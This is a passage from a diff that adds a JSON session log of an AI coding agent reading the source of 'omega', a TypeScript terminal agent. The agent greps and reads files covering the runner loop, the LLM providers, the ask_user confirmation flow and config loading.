Backspace para borrar.\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/ask-user-input.ts-7- */\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-159-  /** Pausa la UI y muestra un prompt inline para que el usuario responda\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-160-   * una pregunta del agente. Devuelve la respuesta. */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts:161:  async askUser(question: string): Promise<string> {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-162-    this.#lock();\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-163-    this.#clearLive();\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-269-      if (this.#abortSignal) {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-270-        this.#abortSignal.abort();\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts:271:        // Si estamos en ask_user (reading=true), forzamos que el componente\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-272-        // termine con resultado vacío para cancelar la confirmación.\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-273-        if (this.#reading && this.#resolve) {\n--\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-14-import { Message } from \"./message.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-15-import { Session } from \"./session.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts:16:import { AskUserTool } from \"./tools/ask-user.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-17-import { BashTool } from \"./tools/bash.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-18-import { EditTool } from \"./tools/edit.js\";\n--\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-48-- edit: para cambios quirúrgicos; el texto a reemplazar debe matchear exacto.\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-49-- write: solo para archivos nuevos o reescrituras completas.\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts:50:- ask_user: pedí confirmación al usuario antes de acciones destructivas o cuando\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-51-  necesites que elija entre opciones.\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-52-\n--\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-57-  o lint según el proyecto) y corregí si hace falta.\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-58-- Antes de instalar dependencias, borrar archivos, ejecutar comandos destructivos\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts:59:  o hacer cambios irreversibles, usá ask_user para pedir confirmación.\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-60-\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-61-Estilo:\n--\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-91-\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-92-  haikuAgent\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts:93:    .addTool(new AskUserTool())\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-94-    .addTool(new BashTool())\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-95-    .addTool(new GrepTool())\n--\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-205-        spinner.stop();\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-206-        // Mostrar prompt inline y esperar respuesta del usuario\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts:207:        const answer = await screen.askUser(question);\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-208-        spinner.start();\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-209-        return answer;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-16-  maxContextTokens?: number;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-17-  signal?: AbortSignal;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:18:  /** Si se provee, las invocaciones a la tool `ask_user` pausan el runner\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-19-   * y llaman a este callback. La respuesta se inyecta como tool_result. */\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-20-  onAskUser?: (question: string) => Promise<string>;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-33-      rawOutput?: string;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-34-    }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:35:  | { type: \"ask_user\"; question: string; toolId: string };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-36-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-37-/** Estado mutable que comparten los métodos de un turno del loop. */\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-199-  async *#executeTools(state: TurnState): AsyncGenerator<RunnerEvent> {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-200-    for (const block of state.toolBlocks) {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:201:      if (block.name === \"ask_user\") {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-202-        yield* this.#handleAskUser(block, state);\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-203-        continue;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-228-    const question =\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-229-      (block.input as { question?: string }).question ?? \"¿Continuar?\";\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:230:    yield { type: \"ask_user\", question, toolId: block.id };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-231-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-232-    const answer = await this.#onAskUser(question);",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_03_OD8nGaOj3e0EtYvMXKq83875",
+          "content": "\n-- grep \"stop_reason|end_turn\" en src --\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-17-  role: \"assistant\";\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-18-  content: AnthropicContentBlock[];\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts:19:  stop_reason: \"end_turn\" | \"max_tokens\" | \"tool_use\";\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-20-  usage: { input_tokens: number; output_tokens: number };\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-21-};\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-48-    return {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-49-      content,\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts:50:      stop_reason: data.stop_reason === \"tool_use\" ? \"tool_use\" : data.stop_reason,\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-51-      usage: {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-52-        input_tokens: data.usage.input_tokens,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-15-type LLMResponse = {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-16-  content: Block[];\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts:17:  stop_reason: \"end_turn\" | \"tool_use\" | \"max_tokens\";\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-18-  usage: { input_tokens: number; output_tokens: number };\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-19-  cost: number; // USD\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-26-  | {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-27-      type: \"done\";\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts:28:      stop_reason: \"end_turn\" | \"tool_use\" | \"max_tokens\";\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-29-      usage: { input_tokens: number; output_tokens: number };\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-30-      cost: number;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-213-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-214-  const finishReason = choice.finish_reason as string;\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:215:  const stop_reason: LLMResponse[\"stop_reason\"] =\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:216:    finishReason === \"tool_calls\" ? \"tool_use\" : finishReason === \"max_tokens\" ? \"max_tokens\" : \"end_turn\";\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-217-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-218-  const usageData = data.usage as Record<string, number>;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-229-  return {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-230-    content,\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:231:    stop_reason,\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-232-    usage: {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-233-      input_tokens: usageData.prompt_tokens,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-542-    }\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-543-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:544:    const stopReason: \"end_turn\" | \"tool_use\" | \"max_tokens\" =\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-545-      finishReason === \"tool_calls\"\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-546-        ? \"tool_use\"\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-547-        : finishReason === \"length\"\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-548-          ? \"max_tokens\"\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:549:          : \"end_turn\";\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-550-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-551-    const cost = calculateCost(\"\", inputTokens, outputTokens);\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-553-    yield {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-554-      type: \"done\",\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:555:      stop_reason: stopReason,\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-556-      usage: { input_tokens: inputTokens, output_tokens: outputTokens },\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-557-      cost,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-195-    expect(result.content[0].type).toBe(\"text\");\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-196-    expect((result.content[0] as { text: string }).text).toBe(\"Hello!\");\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts:197:    expect(result.stop_reason).toBe(\"end_turn\");\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-198-    expect(result.usage.input_tokens).toBe(10);\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-199-    expect(result.usage.output_tokens).toBe(5);\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-216-    };\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-217-    const result = parseResponse(data, model, null);\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts:218:    expect(result.stop_reason).toBe(\"tool_use\");\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-219-    expect(result.content).toHaveLength(1);\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-220-    expect(result.content[0].type).toBe(\"tool_use\");\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-230-    };\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-231-    const result = parseResponse(data, model, null);\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts:232:    expect(result.stop_reason).toBe(\"max_tokens\");\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-233-  });\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/providers/openrouter-provider.test.ts-234-\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-39-    yield {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-40-      type: \"done\",\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts:41:      stop_reason: resp.stop_reason,\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-42-      usage: resp.usage,\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-43-      cost: resp.cost,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-62-  return {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-63-    content: [{ type: \"text\", text }],\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts:64:    stop_reason: \"end_turn\",\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-65-    usage: { input_tokens: 10, output_tokens: 5 },\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-66-    cost: 0.0001,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-76-      ...tc,\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-77-    })),\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts:78:    stop_reason: \"tool_use\",\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-79-    usage: { input_tokens: 20, output_tokens: 10 },\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-80-    cost: 0.0002,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-91-      ...toolCalls.map((tc) => ({ type: \"tool_use\" as const, ...tc })),\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-92-    ],\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts:93:    stop_reason: \"tool_use\",\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-94-    usage: { input_tokens: 30, output_tokens: 15 },\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-95-    cost: 0.0003,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-133-  describe(\"tool use response\", () => {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-134-    it(\"should execute tool and emit tool_result\", async () => {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts:135:      // 1st: tool_use, 2nd: end_turn\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-136-      const provider = new MockLLMProvider([\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-137-        toolUseResponse([{ id: \"t1\", name: \"bash\", input: { command: \"echo hello\" } }]),\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-179-      const provider = new MockLLMProvider([{\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-180-        content: [{ type: \"text\", text: \"Partial...\" }],\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts:181:        stop_reason: \"max_tokens\",\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-182-        usage: { input_tokens: 10, output_tokens: 5 },\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-183-        cost: 0.0001,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-41-  }\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-42-  async call() {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts:43:    return { content: [], stop_reason: \"end_turn\" as const, usage: { input_tokens: 0, output_tokens: 0 }, cost: 0 };\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-44-  }\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-45-  async *callStream() {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts:46:    yield { type: \"done\" as const, stop_reason: \"end_turn\" as const, usage: { input_tokens: 0, output_tokens: 0 }, cost: 0 };\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-47-  }\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-48-}\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-40-  toolBlocks: Array<{ id: string; name: string; input: unknown }>;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-41-  toolResults: ToolMessage[];\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:42:  stopReason: \"end_turn\" | \"tool_use\" | \"max_tokens\";\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-43-}\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-44-\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-126-      toolBlocks: [],\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-127-      toolResults: [],\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:128:      stopReason: \"end_turn\",\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-129-    };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-130-  }\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-157-          });\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-158-        } else if (event.type === \"done\") {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:159:          state.stopReason = event.stop_reason;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-160-          this.#metrics.totalInputTokens += event.usage.input_tokens;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-161-          this.#metrics.totalOutputTokens += event.usage.output_tokens;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-192-      }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-193-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:194:      state.stopReason = data.stop_reason;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-195-    }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-196-  }\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-359-      }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-360-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:361:      if (state.stopReason === \"end_turn\") {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:362:        logger.info(\"Agent finished (end_turn)\");\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-363-        break;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-364-      }",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_3kgroohRHENmS5yUohaf5108",
+          "name": "read",
+          "input": {
+            "path": "src/runner.ts",
+            "offset": 355,
+            "limit": 20
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_PMU3wekXEfSU3uktU6Mi7385",
+          "name": "read",
+          "input": {
+            "path": "src/providers/anthropic-llm-provider.ts",
+            "offset": 1,
+            "limit": 80
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_knY9B6QKMlqa2CwAwdiz9859",
+          "name": "bash",
+          "input": {
+            "command": "head -5 src/config.ts && echo \"---\" && grep -n \"validateEnv\\|OPENROUTER_API_KEY\\|ANTHROPIC_API_KEY\\|PROVIDER\" src/config.ts"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_3kgroohRHENmS5yUohaf5108",
+          "content": "          type: \"text\",\n          text: \"⚠ La respuesta se cortó (max_tokens). Subí el límite o pedí algo más chico.\",\n        };\n        break;\n      }\n\n      if (state.stopReason === \"end_turn\") {\n        logger.info(\"Agent finished (end_turn)\");\n        break;\n      }\n\n      steps--;\n      if (steps === 0) {\n        logger.warn(`Max steps reached (${this.#maxSteps})`);\n      }\n    }\n  }\n\n  getMetrics() {\n    return {",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_PMU3wekXEfSU3uktU6Mi7385",
+          "content": "import { AgentConfig } from \"../agent-config.js\";\nimport { logger } from \"../logger.js\";\nimport { Message } from \"../message.js\";\nimport { Block, calculateCost, LLMProvider, LLMResponse, StreamEvent } from \"./llm-provider.js\";\n\nconst TIMEOUT_MS = 60000;\nconst MAX_RETRIES = 3;\nconst INITIAL_BACKOFF_MS = 1000;\n\ntype AnthropicContentBlock =\n  | { type: \"text\"; text: string }\n  | { type: \"tool_use\"; id: string; name: string; input: unknown };\n\ntype AnthropicResponse = {\n  id: string;\n  type: \"message\";\n  role: \"assistant\";\n  content: AnthropicContentBlock[];\n  stop_reason: \"end_turn\" | \"max_tokens\" | \"tool_use\";\n  usage: { input_tokens: number; output_tokens: number };\n};\n\nclass AnthropicProvider extends LLMProvider {\n  constructor(apiKey: string) {\n    super({\n      apiKey,\n      url: \"https://api.anthropic.com/v1/messages\",\n    });\n  }\n\n  private async sleep(ms: number): Promise<void> {\n    return new Promise((resolve) => setTimeout(resolve, ms));\n  }\n\n  private parseResponse(data: AnthropicResponse, model: string): LLMResponse {\n    const content: Block[] = data.content.map((block) => {\n      if (block.type === \"text\") {\n        return { type: \"text\", text: block.text };\n      }\n      return {\n        type: \"tool_use\",\n        id: block.id,\n        name: block.name,\n        input: block.input,\n      };\n    });\n\n    return {\n      content,\n      stop_reason: data.stop_reason === \"tool_use\" ? \"tool_use\" : data.stop_reason,\n      usage: {\n        input_tokens: data.usage.input_tokens,\n        output_tokens: data.usage.output_tokens,\n      },\n      cost: calculateCost(model, data.usage.input_tokens, data.usage.output_tokens),\n    };\n  }\n\n  private async callWithRetry(\n    messages: Message[],\n    agent: AgentConfig,\n    attempt: number = 1,\n    userSignal?: AbortSignal,\n  ): Promise<LLMResponse> {\n    const headers: Record<string, string> = {\n      \"x-api-key\": this.apiKey(),\n      \"anthropic-version\": \"2023-06-01\",\n      \"content-type\": \"application/json\",\n    };\n\n    const body: Record<string, unknown> = {\n      model: agent.model,\n      system: agent.systemPrompt,\n      max_tokens: agent.maxTokens,\n      messages,\n      tools: Object.values(agent.tools()).map((t) => t.toJSON()),\n    };\n\n    try {\n      const controller = new AbortController();",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_knY9B6QKMlqa2CwAwdiz9859",
+          "content": "import { logger } from \"./logger.js\";\n\ninterface Config {\n  anthropicApiKey: string;\n  openrouterApiKey: string;\n---\n15:function validateEnv(): Config {\n19:  const openrouterApiKey = process.env.OPENROUTER_API_KEY;\n21:    logger.error(\"Missing required env var: OPENROUTER_API_KEY\");\n22:    throw new Error(\"OPENROUTER_API_KEY environment variable is required. Create a .env file or set it in ~/.omega/.env\");\n25:  const apiKey = process.env.ANTHROPIC_API_KEY || \"\";\n56:export { Config, validateEnv };\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_YdW8Fg3itjUarfjDhGgM8954",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "path": "src",
+            "pattern": "truncate.*200|truncate\\(output"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_7oFIgZdbF5zTlBEodIcR8702",
+          "name": "read",
+          "input": {
+            "path": "src/runner.ts",
+            "offset": 200,
+            "limit": 80
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_52NBsFsnOpFBzOwQVkXt0098",
+          "name": "read",
+          "input": {
+            "path": "src/config.ts"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_YdW8Fg3itjUarfjDhGgM8954",
+          "content": "Sin resultados.",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_7oFIgZdbF5zTlBEodIcR8702",
+          "content": "    for (const block of state.toolBlocks) {\n      if (block.name === \"ask_user\") {\n        yield* this.#handleAskUser(block, state);\n        continue;\n      }\n\n      this.#metrics.totalToolCalls++;\n\n      const tool = this.#agentConfig.getTool(block.name);\n      if (!tool) {\n        yield* this.#handleUnknownTool(block.name, block.id, state);\n        continue;\n      }\n\n      yield { type: \"tool_use\", name: tool.name, input: block.input };\n\n      yield* this.#handleToolExecution(tool.name, block.id, block.input, state);\n    }\n  }\n\n  // ── sub-fases de executeTools ──────────────────────────────────────\n\n  async *#handleAskUser(\n    block: { id: string; name: string; input: unknown },\n    state: TurnState,\n  ): AsyncGenerator<RunnerEvent> {\n    if (!this.#onAskUser) return;\n\n    const question =\n      (block.input as { question?: string }).question ?? \"¿Continuar?\";\n    yield { type: \"ask_user\", question, toolId: block.id };\n\n    const answer = await this.#onAskUser(question);\n    const output = answer || \"(sin respuesta)\";\n    yield {\n      type: \"tool_result\",\n      output: \"(confirmación recibida)\",\n      rawOutput: output,\n    };\n    state.toolResults.push({\n      type: \"tool_result\",\n      tool_use_id: block.id,\n      content: output,\n      is_error: false,\n    });\n  }\n\n  async *#handleUnknownTool(\n    name: string,\n    toolId: string,\n    state: TurnState,\n  ): AsyncGenerator<RunnerEvent> {\n    const output = `Error: unknown tool \"${name}\"`;\n    logger.error(output);\n    yield { type: \"tool_result\", output };\n    state.toolResults.push({\n      type: \"tool_result\",\n      tool_use_id: toolId,\n      content: output,\n      is_error: true,\n    });\n  }\n\n  async *#handleToolExecution(\n    toolName: string,\n    toolId: string,\n    input: unknown,\n    state: TurnState,\n  ): AsyncGenerator<RunnerEvent> {\n    const tool = this.#agentConfig.getTool(toolName)!;\n    let output: string;\n    let isError = false;\n    try {\n      output = tool.execute(input) as string;\n    } catch (err: unknown) {\n      isError = true;\n      output = `Error executing tool \"${toolName}\": ${err instanceof Error ? err.message : String(err)}`;\n      logger.error(\"Tool execution threw\", { tool: toolName, error: output });\n    }\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_52NBsFsnOpFBzOwQVkXt0098",
+          "content": "import { logger } from \"./logger.js\";\n\ninterface Config {\n  anthropicApiKey: string;\n  openrouterApiKey: string;\n  model: string;\n  maxTokens: number;\n  maxSteps: number;\n  maxContextMessages: number;\n  maxContextTokens: number;\n  nodeEnv: string;\n  screenPadding: number;\n}\n\nfunction validateEnv(): Config {\n  logger.info(\"Validating environment variables...\");\n\n  // OpenRouter es el provider por defecto (ver #18 para selección dinámica).\n  const openrouterApiKey = process.env.OPENROUTER_API_KEY;\n  if (!openrouterApiKey) {\n    logger.error(\"Missing required env var: OPENROUTER_API_KEY\");\n    throw new Error(\"OPENROUTER_API_KEY environment variable is required. Create a .env file or set it in ~/.omega/.env\");\n  }\n\n  const apiKey = process.env.ANTHROPIC_API_KEY || \"\";\n\n  const model = process.env.MODEL || \"claude-haiku-4-5-20251001\";\n  const maxTokens = parseInt(process.env.MAX_TOKENS || \"1024\", 10);\n  const maxSteps = parseInt(process.env.MAX_STEPS || \"15\", 10);\n  const maxContextMessages = parseInt(process.env.MAX_CONTEXT_MESSAGES || \"50\", 10);\n  const maxContextTokens = parseInt(process.env.MAX_CONTEXT_TOKENS || \"100000\", 10);\n  const nodeEnv = process.env.NODE_ENV || \"development\";\n  const screenPadding = parseInt(process.env.SCREEN_PADDING || \"0\", 10);\n\n  const config: Config = {\n    anthropicApiKey: apiKey,\n    openrouterApiKey,\n    model,\n    maxTokens,\n    maxSteps,\n    maxContextMessages,\n    maxContextTokens,\n    nodeEnv,\n    screenPadding,\n  };\n\n  logger.info(\"Config loaded successfully\", {\n    model,\n    maxTokens,\n    maxSteps,\n    nodeEnv,\n  });\n  return config;\n}\n\nexport { Config, validateEnv };\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_HK6pXtbZEJW2gM9vMEgV2304",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "path": "src/runner.ts",
+            "pattern": "truncate|rawOutput"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_jVxEmNrYjyuyQErejAsq2415",
+          "name": "read",
+          "input": {
+            "offset": 255,
+            "file": "src/runner.ts",
+            "limit": 35
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_8VoGsZ4Nagb5APndhcgc5839",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "path": "src/index.ts",
+            "pattern": "openrouterApiKey!"
